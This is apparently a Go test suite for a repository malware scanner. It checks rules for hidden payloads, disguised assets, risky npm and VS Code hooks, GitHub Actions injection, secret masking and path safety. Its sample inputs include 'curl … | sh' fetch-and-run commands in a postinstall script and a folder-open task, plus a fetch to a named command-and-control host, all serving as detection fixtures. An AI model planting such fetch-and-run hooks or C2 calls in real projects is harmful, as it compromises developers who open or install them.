package scanner

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func scan(t *testing.T, files map[string]string) Result {
	t.Helper()
	m := MemorySource{}
	for k, v := range files {
		m[k] = []byte(v)
	}
	return New(BuiltinRules()).Scan(context.Background(), m)
}

func has(r Result, rule string) *Finding {
	for i := range r.Findings {
		if r.Findings[i].RuleID == rule {
			return &r.Findings[i]
		}
	}
	return nil
}

func TestCleanRepoIsClean(t *testing.T) {
	r := scan(t, map[string]string{
		"main.go":      "package main\nfunc main(){}\n",
		"package.json": `{"name":"x","scripts":{"build":"tsc"},"dependencies":{"react":"^18"}}`,
	})
	if r.Status != StatusClean || len(r.Findings) != 0 {
		t.Fatalf("want clean, got %s %+v", r, r.Findings)
	}
}

func TestKnownSignatureIsConfirmed(t *testing.T) {
	r := scan(t, map[string]string{"a.js": "x\nPOLINCHASER-TEST-MALWARE-SIGNATURE-DO-NOT-EXECUTE\n"})
	f := has(r, "PC-SIG-TEST-001")
	if f == nil || f.Confidence != ConfidenceConfirmed || f.Severity != SeverityCritical || f.LineStart != 2 {
		t.Fatalf("bad finding: %+v", f)
	}
	if strings.Contains(f.Evidence, "POLINCHASER-TEST-MALWARE") {
		t.Fatal("evidence must not reproduce payload")
	}
}

func TestGenericSuspiciousStringIsNotConfirmed(t *testing.T) {
	r := scan(t, map[string]string{"a.js": "eval(atob('aGVsbG8='))"})
	f := has(r, "PC-STA-EVAL-001")
	if f == nil || f.Confidence == ConfidenceConfirmed || f.Category == CatKnownMalware {
		t.Fatalf("heuristic must not be confirmed: %+v", f)
	}
}

func TestBlankGapHiddenPayload(t *testing.T) {
	body := "export default {};\n" + strings.Repeat("\n", 60) + strings.Repeat("a", 2000) + "\n"
	r := scan(t, map[string]string{"postcss.config.mjs": body})
	f := has(r, "PC-HID-GAP-001")
	if f == nil || f.Confidence != ConfidenceHigh || f.LineStart != 62 {
		t.Fatalf("bad gap finding: %+v", f)
	}
	r = scan(t, map[string]string{"x.js": "a\n" + strings.Repeat("\n", 10) + "b\n"})
	if has(r, "PC-HID-GAP-001") != nil {
		t.Fatal("small gaps must not trigger")
	}
}

func TestDisguisedFont(t *testing.T) {
	r := scan(t, map[string]string{"public/f.woff2": "const x = require('child_process');"})
	if f := has(r, "PC-HID-MAGIC-001"); f == nil || f.Confidence != ConfidenceHigh {
		t.Fatalf("want disguised asset: %+v", r.Findings)
	}
	r = scan(t, map[string]string{"public/f.woff2": "wOF2....."})
	if has(r, "PC-HID-MAGIC-001") != nil {
		t.Fatal("valid font flagged")
	}
	r = scan(t, map[string]string{"a.png": "MZ\x90\x00binary"})
	if f := has(r, "PC-HID-MAGIC-001"); f == nil || f.Severity != SeverityCritical {
		t.Fatal("executable disguised as image must be critical")
	}
}

func TestVSCodeFolderOpen(t *testing.T) {
	r := scan(t, map[string]string{".vscode/tasks.json": `{"tasks":[{"command":"curl x | sh","runOptions":{"runOn":"folderOpen"}}]}`})
	if f := has(r, "PC-PER-VSC-001"); f == nil || f.Severity != SeverityHigh {
		t.Fatalf("want high: %+v", r.Findings)
	}
}

func TestSecretsAreMasked(t *testing.T) {
	secret := "ghp_" + strings.Repeat("a1B2", 9)
	r := scan(t, map[string]string{"cfg.js": "const t = '" + secret + "'"})
	f := has(r, "PC-SEC-GH-001")
	if f == nil || f.Category != CatCredentialExpose {
		t.Fatalf("secret not found: %+v", r.Findings)
	}
	if strings.Contains(f.Evidence, secret) || strings.Contains(f.Fingerprint, secret) {
		t.Fatal("secret leaked into finding")
	}
}

func TestNpmLifecycleAndTypo(t *testing.T) {
	r := scan(t, map[string]string{"package.json": `{"scripts":{"postinstall":"curl http://x/y | sh"},"dependencies":{"lodsh":"1"}}`})
	if has(r, "PC-DEP-NPM-001") == nil {
		t.Fatal("risky postinstall missed")
	}
	if has(r, "PC-DEP-TYPO-001") == nil {
		t.Fatal("typosquat missed")
	}
}

func TestActionsRules(t *testing.T) {
	wf := "on: pull_request_target\npermissions: write-all\njobs:\n  a:\n    steps:\n      - uses: evil/act@v1\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: echo ${{ github.event.pull_request.title }}\n"
	r := scan(t, map[string]string{".github/workflows/ci.yml": wf})
	for _, id := range []string{"PC-CI-PIN-001", "PC-CI-INJ-001", "PC-CI-PRT-001", "PC-CI-PERM-001"} {
		if has(r, id) == nil {
			t.Errorf("missing %s", id)
		}
	}
	for _, f := range r.Findings {
		if f.Category == CatKnownMalware {
			t.Error("CI findings must never be known malware")
		}
	}
}

func TestSafePath(t *testing.T) {
	for _, p := range []string{"../etc/passwd", "/abs", "a/../../b", "", "a\\b", "a\x00b"} {
		if _, ok := SafePath(p); ok {
			t.Errorf("accepted %q", p)
		}
	}
	if c, ok := SafePath("a/./b/c.js"); !ok || c != "a/b/c.js" {
		t.Errorf("clean failed: %q", c)
	}
	r := scan(t, map[string]string{"../evil.js": "x"})
	if r.Status != StatusIncomplete || r.FilesScanned != 0 {
		t.Fatalf("unsafe path must make scan incomplete: %s", r)
	}
}

func TestLimitsMakeScanIncompleteNotClean(t *testing.T) {
	m := MemorySource{"big.js": []byte(strings.Repeat("a", 100))}
	r := (&Engine{Detectors: New(BuiltinRules()).Detectors, Limits: Limits{MaxFileBytes: 10}}).Scan(context.Background(), m)
	if r.Status != StatusIncomplete {
		t.Fatalf("truncated file must be incomplete, got %s", r.Status)
	}
	m = MemorySource{"a": []byte("x"), "b": []byte("x")}
	r = (&Engine{Detectors: New(BuiltinRules()).Detectors, Limits: Limits{MaxFiles: 1}}).Scan(context.Background(), m)
	if r.Status != StatusIncomplete {
		t.Fatal("file-count limit must be incomplete")
	}
}

func TestTimeoutIsNotClean(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Nanosecond)
	defer cancel()
	time.Sleep(2 * time.Millisecond)
	r := New(BuiltinRules()).Scan(ctx, MemorySource{"a.js": []byte("x")})
	if r.Status == StatusClean {
		t.Fatal("timed-out scan reported clean")
	}
}

func TestDirSourceDoesNotFollowSymlinks(t *testing.T) {
	dir := t.TempDir()
	outside := t.TempDir()
	os.WriteFile(filepath.Join(outside, "secret.js"), []byte("POLINCHASER-TEST-MALWARE-SIGNATURE-DO-NOT-EXECUTE"), 0o600)
	os.WriteFile(filepath.Join(dir, "ok.js"), []byte("1"), 0o600)
	if err := os.Symlink(outside, filepath.Join(dir, "link")); err != nil {
		t.Skip("symlinks unsupported")
	}
	os.Symlink(filepath.Join(outside, "secret.js"), filepath.Join(dir, "f.js"))
	os.MkdirAll(filepath.Join(dir, ".git"), 0o700)
	os.WriteFile(filepath.Join(dir, ".git", "x.js"), []byte("POLINCHASER-TEST-MALWARE-SIGNATURE-DO-NOT-EXECUTE"), 0o600)
	r := New(BuiltinRules()).Scan(context.Background(), DirSource{dir})
	if len(r.Findings) != 0 {
		t.Fatalf("followed symlink or scanned .git: %+v", r.Findings)
	}
	if r.Status != StatusIncomplete {
		t.Fatalf("skipped symlinks must be reported, got %s", r.Status)
	}
}

func TestFindingsDeduplicatedAndSorted(t *testing.T) {
	r := scan(t, map[string]string{
		"a.js": "eval(atob('x'))",
		"b.js": "POLINCHASER-TEST-MALWARE-SIGNATURE-DO-NOT-EXECUTE",
	})
	if len(r.Findings) < 2 || r.Findings[0].Severity != SeverityCritical {
		t.Fatalf("not sorted by severity: %+v", r.Findings)
	}
	if r.Highest() != SeverityCritical || r.Status != StatusFindings {
		t.Fatal("status/highest wrong")
	}
}

func TestPolinRiderSignatures(t *testing.T) {
	// Synthetic strings built from the reported markers; no real payload is reproduced.
	for id, content := range map[string]string{
		"PC-SIG-POLINRIDER-001":    `x = ("rmcej` + `%otb%",1)`,
		"PC-SIG-POLINRIDER-002":    `x = ("Cot%3` + `t=shtP",1)`,
		"PC-SIG-POLINRIDER-C2-001": `fetch("https://260120.v` + `ercel.app/settings/mac")`,
		"PC-SIG-POLINRIDER-C2-007": `const a = "TMfKQEd7TJJa5xNZJ` + `Z2Lep838vrzrs7mAP"`,
	} {
		r := scan(t, map[string]string{"postcss.config.mjs": content})
		f := has(r, id)
		if f == nil || f.Severity != SeverityCritical || f.Confidence != ConfidenceConfirmed {
			t.Errorf("%s not confirmed: %+v", id, r.Findings)
		}
	}
	// The two hostnames removed for lack of primary-source support must not match any more.
	r := scan(t, map[string]string{"a.js": `x="gowreesh-vt.github.io shop.ceenami.com"`})
	for _, f := range r.Findings {
		if strings.HasPrefix(f.RuleID, "PC-SIG-") {
			t.Errorf("unverified host still flagged by signature: %s", f.RuleID)
		}
	}
}
